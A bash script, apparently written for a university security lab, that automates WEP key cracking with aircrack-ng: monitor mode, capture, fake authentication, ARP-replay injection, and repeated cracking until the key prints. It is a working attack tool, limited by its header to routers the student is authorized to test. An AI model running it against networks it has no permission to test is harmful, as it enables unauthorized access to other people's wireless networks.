#!/usr/bin/env bash
#
# wep-crack.sh — authorized WEP key-recovery automation (Lab #10, CS VIII)
#
# Drives the standard aircrack-ng flow against a WEP access point you are
# authorized to test (your own GL-AR300M16, or the class router during the
# evaluation window). WEP falls to a statistical/PTW attack on captured IVs —
# NO dictionary is used, which is the whole point of the lab.
#
#   active  mode: monitor -> fake-auth -> ARP replay (needs an injecting card,
#                 e.g. Atheros AR9271). This is what recovers the key fast.
#   passive mode: monitor + capture only (works on the Intel AC8260, which
#                 cannot inject). Good for practice and for the analysis half
#                 of the writeup.
#
# Usage:
#   sudo ./wep-crack.sh -i wlp2s0 -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m active|passive] [-o prefix] [-t N]
#
# Example:
#   sudo ./wep-crack.sh -i wlan0 -b 11:22:33:44:55:66 -c 6 -m active -o cap_gl
#
# Cleanup (stop monitor + restore NetworkManager) runs automatically on exit,
# including Ctrl-C. If WiFi ever stays dark, run: sudo airmon-ng stop <if>mon ; sudo systemctl start NetworkManager
#
set -u

# ---- defaults -------------------------------------------------------------
IFACE=""
BSSID=""
CHANNEL=""
ESSID=""
MODE="active"
PREFIX="wepcap"
IV_TARGET=20000          # aircrack is retried each time #Data grows by this much (-t)
MIN_IVS=5000             # no aircrack attempt until #Data reaches this many IVs
RETRY_SECS=15            # how often to re-check the capture / re-run aircrack

usage() { sed -n '2,30p' "$0"; exit 1; }

while getopts ":i:b:c:e:m:o:t:h" opt; do
  case "$opt" in
    i) IFACE="$OPTARG" ;;
    b) BSSID="$OPTARG" ;;
    c) CHANNEL="$OPTARG" ;;
    e) ESSID="$OPTARG" ;;
    m) MODE="$OPTARG" ;;
    o) PREFIX="$OPTARG" ;;
    t) IV_TARGET="$OPTARG" ;;
    h|*) usage ;;
  esac
done

# ---- preflight ------------------------------------------------------------
[[ $EUID -eq 0 ]] || { echo "[!] Run with sudo."; exit 1; }
[[ -n "$IFACE" && -n "$BSSID" && -n "$CHANNEL" ]] || usage
for t in airmon-ng airodump-ng aireplay-ng aircrack-ng iw; do
  command -v "$t" >/dev/null || { echo "[!] Missing: $t (sudo dnf install aircrack-ng)"; exit 1; }
done
[[ "$MODE" == "active" || "$MODE" == "passive" ]] || { echo "[!] -m must be active|passive"; exit 1; }
[[ "$IV_TARGET" =~ ^[1-9][0-9]*$ ]] || { echo "[!] -t must be a positive number of IVs"; exit 1; }

# ---- output location ------------------------------------------------------
# All capture/key/log files live under logs/ (gitignored) to keep the repo clean.
LOGDIR="logs"
mkdir -p "$LOGDIR"
OUT="${LOGDIR}/${PREFIX}"

MON=""        # monitor interface name, discovered after airmon-ng start
AIRODUMP_PID=""
REPLAY_PID=""

cleanup() {
  echo; echo "[*] Cleaning up..."
  [[ -n "$REPLAY_PID"   ]] && kill "$REPLAY_PID"   2>/dev/null
  [[ -n "$AIRODUMP_PID" ]] && kill "$AIRODUMP_PID" 2>/dev/null
  if [[ -n "$MON" ]]; then airmon-ng stop "$MON" >/dev/null 2>&1; fi
  systemctl start NetworkManager 2>/dev/null
  echo "[*] Monitor stopped, NetworkManager restarted. WiFi should be back."
}
# cleanup runs exactly once, on the way out. Ctrl-C (INT) / TERM don't run
# cleanup directly — they turn into a real exit, which fires the EXIT trap.
# (Trapping cleanup on INT alone would run it but then resume the loop, so the
# program never actually finished.)
trap cleanup EXIT
trap 'exit 130' INT TERM

# ---- start monitor --------------------------------------------------------
echo "[*] Freeing the radio (stopping NetworkManager/wpa_supplicant)..."
airmon-ng check kill >/dev/null 2>&1

echo "[*] Enabling monitor mode on $IFACE..."
airmon-ng start "$IFACE" >/dev/null 2>&1

# airmon-ng may name it <iface>mon, or rename to e.g. mon0 — discover it.
MON=$(iw dev | awk '/Interface/{n=$2} /type monitor/{print n; exit}')
[[ -z "$MON" ]] && MON="${IFACE}mon"
echo "[*] Monitor interface: $MON"

echo "[*] Locking to channel $CHANNEL..."
iw dev "$MON" set channel "$CHANNEL" 2>/dev/null

# ---- start capture --------------------------------------------------------
rm -f "${OUT}"-*.cap "${OUT}"-*.csv 2>/dev/null
echo "[*] Starting capture -> ${OUT}-01.cap (BSSID $BSSID, ch $CHANNEL)"
airodump-ng --bssid "$BSSID" -c "$CHANNEL" -w "$OUT" --write-interval 1 "$MON" \
  >/dev/null 2>&1 &
AIRODUMP_PID=$!
sleep 4

# ---- active injection -----------------------------------------------------
if [[ "$MODE" == "active" ]]; then
  MYMAC=$(iw dev "$MON" info 2>/dev/null | awk '/addr/{print $2; exit}')
  echo "[*] Verifying injection on this card..."
  if ! aireplay-ng --test "$MON" 2>&1 | grep -qi "Injection is working"; then
    echo "[!] Injection test did NOT pass on $IFACE."
    echo "    This card (e.g. Intel AC8260) likely cannot inject. Falling back"
    echo "    to PASSIVE capture. Use an AR9271 USB adapter for the active attack."
    MODE="passive"
  fi
fi

if [[ "$MODE" == "active" ]]; then
  echo "[*] Associating with AP (fake auth)..."
  # keep re-authenticating every 10s so we stay associated
  aireplay-ng --fakeauth 10 -o 1 -q 10 -a "$BSSID" -h "$MYMAC" \
    ${ESSID:+-e "$ESSID"} "$MON" >/dev/null 2>&1 &

  echo "[*] Starting ARP replay to pump IVs (this is the key step)..."
  aireplay-ng --arpreplay -b "$BSSID" -h "$MYMAC" "$MON" >/dev/null 2>&1 &
  REPLAY_PID=$!
else
  echo "[*] PASSIVE mode: capturing only. IVs will accrue slowly from live traffic."
fi

# ---- crack loop -----------------------------------------------------------
echo "[*] Watching #Data and retrying aircrack-ng every ${RETRY_SECS}s..."
echo "[*] Press Ctrl-C to stop (cleanup is automatic)."
KEYFILE="${OUT}.key"
last_iv=0                # #Data at the last aircrack attempt (0 = none yet)
while true; do
  sleep "$RETRY_SECS"
  CSV="${OUT}-01.csv"
  ivs=0
  if [[ -f "$CSV" ]]; then
    # column 11 ("# IV") on the AP row matching our BSSID
    ivs=$(awk -F, -v b="${BSSID^^}" 'toupper($1) ~ b {gsub(/ /,"",$11); print $11; exit}' "$CSV")
    ivs=${ivs:-0}
  fi
  echo "    [#Data ~ ${ivs} IVs]"
  # first try once we have a reasonable pile, then again each time #Data grows by IV_TARGET
  if (( ivs >= MIN_IVS && (last_iv == 0 || ivs - last_iv >= IV_TARGET) )); then
    last_iv=$ivs
    if aircrack-ng -q -l "$KEYFILE" "${OUT}-01.cap" >/dev/null 2>&1 && [[ -s "$KEYFILE" ]]; then
      echo
      echo "============================================================"
      echo " KEY RECOVERED: $(cat "$KEYFILE")"
      echo " Saved to: $KEYFILE   Capture: ${OUT}-01.cap"
      echo "============================================================"
      exit 0
    fi
  fi
done
